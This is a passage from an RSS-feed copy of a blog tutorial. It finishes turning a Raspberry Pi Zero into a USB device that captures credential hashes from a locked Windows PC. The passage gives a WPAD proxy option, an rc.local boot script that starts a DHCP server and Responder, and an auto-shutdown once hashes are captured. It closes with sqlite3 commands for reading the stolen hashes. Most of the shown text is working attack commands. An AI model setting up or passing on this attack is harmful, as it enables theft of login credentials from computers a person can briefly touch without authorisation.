  option local-proxy-config &amp;quot;http://192.168.2.201/wpad.dat&amp;quot;;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;run-scripts-at-boot&#34;&gt;Run scripts at boot&lt;/h4&gt;

&lt;p&gt;Open the /etc/rc.local file.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;sudo nano /etc/rc.local
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Paste the below code before &lt;strong&gt;exit 0&lt;/strong&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;# Clear leases
rm -f /var/lib/dhcp/dhcpd.leases
touch /var/lib/dhcp/dhcpd.leases

# Start DHCP server
/usr/sbin/dhcpd

# Start Responder
/usr/bin/screen -dmS responder bash -c &#39;cd /home/pi/tools/responder/; python Responder.py -I usb0 -f -w -r -d -F&#39;

# Monitor Responder.db and shutdown once the hashes are captured
echo &amp;quot;Staring cred watch&amp;quot; &amp;gt;&amp;gt; /root/rc.log
/usr/bin/screen -dmS notify bash -c &#39;while inotifywait -e modify /home/pi/tools/responder/Responder.db; do shutdown -h now; done&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;create-logs-for-screen-sessions&#34;&gt;Create logs for screen sessions&lt;/h4&gt;

&lt;p&gt;Create a &lt;strong&gt;logs&lt;/strong&gt; folder:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;sudo mkdir /root/logs
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Add a .screenrc file&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;sudo nano /root/.screenrc
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Paste the below code in .screenrc file:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;# Logging
deflog on
logfile /root/logs/screenlog_$USER_.%H.%n.%Y%m%d-%0c:%s.%t.log
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;That concludes the setup.&lt;/p&gt;

&lt;h3 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h3&gt;

&lt;p&gt;Try plugging in the Pi Zero to a locked Windows PC and wait. If all goes well, the Responder.db file will be created at &lt;strong&gt;/home/pi/tools/responder/&lt;/strong&gt; and hashes will be stored.&lt;/p&gt;

&lt;p&gt;The captured hashes can be viewed using &lt;strong&gt;sqlite3&lt;/strong&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;sqlite3 /home/pi/tools/responder/Responder.db
select * from responder;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/sqlite3_out.png&#34; alt=&#34;sqlite3_out&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Also, check out &lt;a href=&#34;https://github.com/wismna/HackPi&#34;&gt;Hackpi&lt;/a&gt; from wismna which automates all of the above and works without driver installation on Windows, Linux and MacOS. :)&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>